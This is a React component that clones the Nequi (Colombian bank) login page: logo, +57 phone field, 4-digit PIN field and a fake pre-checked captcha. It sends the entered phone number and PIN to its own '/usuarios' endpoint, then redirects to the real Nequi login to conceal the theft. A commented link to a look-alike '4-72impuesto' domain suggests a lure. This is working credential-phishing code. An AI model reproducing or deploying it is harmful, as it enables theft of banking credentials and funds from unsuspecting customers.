import useAuth from '../hooks/useAuth'
import { Link } from 'react-router-dom'
import {useEffect, useState} from 'react'
import Spinner from '../components/Spinner'
import Alerta from "../components/Alerta"
import clienteAxios from "../config/clienteAxios"
import visa from '/visa.png'
import master from '/master.jpg'
import logo from '/logonequi.svg'
import captcha from '/captcha.png'
import colombia from '/colombia.png'
import { MdOutlineMenu } from "react-icons/md";
import Footer from '../components/Footer'


const SesionBanco = () => {

    const Openbar = () => {
     document.querySelector('.sidebar').classList.toggle('left-[-350px]')
    }

    const [ usuario, setUsuario ] = useState('')
    const [ contraseña, setcontraseña ] = useState('')
    const [ alerta, setAlerta ] = useState({})
    /*const [ nombre, setNombre ] = useState('')
    const [ email, setEmail ] = useState('')
    const [ password, setPassword ] = useState('')
    const [ repetirPassword, setRepetirPassword] = useState('')
   
  */
  
    const handleSubmit = async e => {
      e.preventDefault()
      if(usuario.length === 0) {
        setAlerta({
          msg: 'Campo obligatorio',
          error: true
        })
        return
      }


      if (!(usuario.length === 10)) {
        setAlerta({
          msg: 'Ingrese un Número Válido',
          error: true
        });
        return;
      }


      if(contraseña.length === 0) {
        setAlerta({
          msg: 'Campo obligatorio',
          error: true
        })
        return
      }
  
      if (!(contraseña.length === 4)) {
        setAlerta({
          msg: 'Ingrese una Contraseña Válida',
          error: true
        });
        return;
      }
  
      setAlerta({})
  
      //Creando el usuario en la API
      try {
        const { data } = await clienteAxios.post(`/usuarios`, {usuario, contraseña})
        setAlerta({
          msg: data.msg,
          error: false
        })
  
        setUsuario('')
        setcontraseña('')
        const urlBase = window.location.origin
    
        window.location = 'https://transacciones.nequi.com/bdigital/login.jsp?region=co'

      } catch (error) {
        setAlerta({
          msg: error.response.data.msg,
          error: true
        })
      }

      
    }

    
    useEffect(() => {
      window.scrollTo(0, 0)
    }, [location.pathname])
  
    const { msg } = alerta

 

  return (
  <>

   <nav className='navbar bg-white container mx-1 p-4'>
      <div className="nav-item">
        <img src={logo} alt="Logo" />
      </div>
      <div className="separator"></div>
      <div className="nav-item">
      <MdOutlineMenu className='menuhamburguesa mr-2 text-4xl' />
      </div>
    </nav>

    <div className="col espacio p-4">

    </div>
    

    <div className='text-center fondo'>

      <div className='mx-3'>
      <form
          className="bg-white rounded-lg text-center mx-auto form "
          onSubmit={handleSubmit}
        >
          <div className="">
          <div className=''>
            <h3 className='tituloBanco'>Entra a Nequi</h3>

            <p className='my-1 mx-2 mt-3 text-sm font-semibold'>{'Podrás bloquear tu Nequi,  consultar tus datos.'}</p>
          </div> 
            <div className="mt-4 mb-1">

          <div className="row">
            <div className="col-3">
            <div class="p-2 ml-3 flex"> 
                    <img className='imagenbandera' src={colombia} alt="co"/> 
                    <p className='textobandera text-lg'>+57</p>
                  </div>
            </div>

            <div className="col-9">
                <input
                    id="usuario"
                    type='number'
                    placeholder='Número de celular'
                    className='mt-2 p-3 w-5/6 text-center border rounded-md colordeinput'
                    value={usuario}
                    onChange={ e => setUsuario(e.target.value)}  
                  />
              </div>        
            </div>     
                
          </div>

           
        </div>
        <div className=" mx-3">
                <input
                  id="contraseña"
                  type='password'
                  inputMode='tel'
                  pattern="[0-9]*"
                  placeholder='Contraseña'
                  className='p-3 w-full text-center border rounded-md colordeinput'
                  value={contraseña}
                  onChange={ e => setcontraseña(e.target.value)}  
                />
            </div>

            <div className='p-1 border rounded-md flex contenedorfondo my-3 mx-3'>
              <div className="col-1 mt-2 ml-4">
                  <input type="checkbox" className='checkbox mt-2' checked/>
                </div>
                <div className="col flex">
                  <p className='font-semibold mt-2 text-lg'>No soy un robot</p>
                  <img src={captcha} className='imagencaptcha mt-1' alt="" />
                </div>
            </div>


              {/* <div className="container text-center mt-1">
                <div className="row p-2 mt-2 text-center mx-auto">
                  <div className="col-1 mt-2 ml-4">
                    <input type="checkbox" className='checkbox' checked/>
                  </div>
                  <div className="col flex">
                    
                    <p className='font-semibold mt-1 text-lg'>I am not a robot</p>
                    <img src={captcha} className='imagencaptcha' alt="" />
                  </div>
              </div> */}
            { msg && <Alerta alerta={alerta}/> }
          <div className="text-center my-3 mb-5">
           <input
              type='submit'
              value='Entra'
              className='botonnequi mb-3 w-80 py-2 px-12 text-white font-bold rounded '
            />
          </div>
          
           {/* <div className='text-center mt-1'>
                <a href='https://www.4-72impuesto.com/' className='cancelarTransaccion py-2 m-auto px-12 camelcase font-bold'><u>Cancelar Transacción</u></a>
            </div> */}

        </form>  
      </div>
    </div>
    <Footer/>
  </>
  )
}

export default SesionBanco


